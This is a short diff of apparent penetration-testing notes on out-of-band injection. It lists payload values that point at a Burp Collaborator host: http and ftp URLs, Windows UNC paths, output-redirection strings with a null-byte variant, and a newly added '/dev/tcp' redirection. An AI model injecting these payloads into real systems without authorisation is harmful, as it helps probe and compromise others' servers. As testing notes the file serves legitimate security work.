@@ -22,11 +22,12 @@ Good candidates for values are:
     http://wzzec5jztfjusa225ubi8pi1osuii7.burpcollaborator.net/a 
     ftp://wzzec5jztfjusa225ubi8pi1osuii7.burpcollaborator.net/a 
 
-Additionally for win this is worth checking too:
+Additionally these are worth checking too:
 
-    \\wzzec5jztfjusa225ubi8pi1osuii7.burpcollaborator.net\a
-
-This might as well work with injections like:
+    >\\wzzec5jztfjusa225ubi8pi1osuii7.burpcollaborator.net\a
+    > /dev/tcp/wzzec5jztfjusa225ubi8pi1osuii7.burpcollaborator.net/80
+    
+This might as well work with injections like (plus the nix variant from above):
 
     >\\wzzec5jztfjusa225ubi8pi1osuii7.burpcollaborator.net\a
     >\\wzzec5jztfjusa225ubi8pi1osuii7.burpcollaborator.net\a<NULLBYTE>
